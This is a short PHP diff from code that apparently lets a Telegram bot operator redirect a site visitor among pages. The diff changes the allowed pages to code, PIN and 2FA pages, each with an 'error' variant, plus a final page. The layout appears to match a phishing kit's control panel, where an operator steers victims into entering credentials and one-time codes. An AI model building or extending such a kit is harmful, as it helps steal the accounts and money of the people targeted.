@@ -38,8 +38,9 @@ if (isset($update['callback_query'])) {
             $redirect_page = basename($parts[2]);
 
             $valid_pages = [
-                'index.php', 'index-error.php', 'otp.php',
-                'otp-error.php', 'finalizar.php'
+                'index.php', 'index-error.php', 'cod.php',
+                'cod-error.php', 'pin.php', 'pin-error.php', 
+                '2FA.php', '2FA-error.php', 'fin.php'
             ];
 
             if (!in_array($redirect_page, $valid_pages)) {
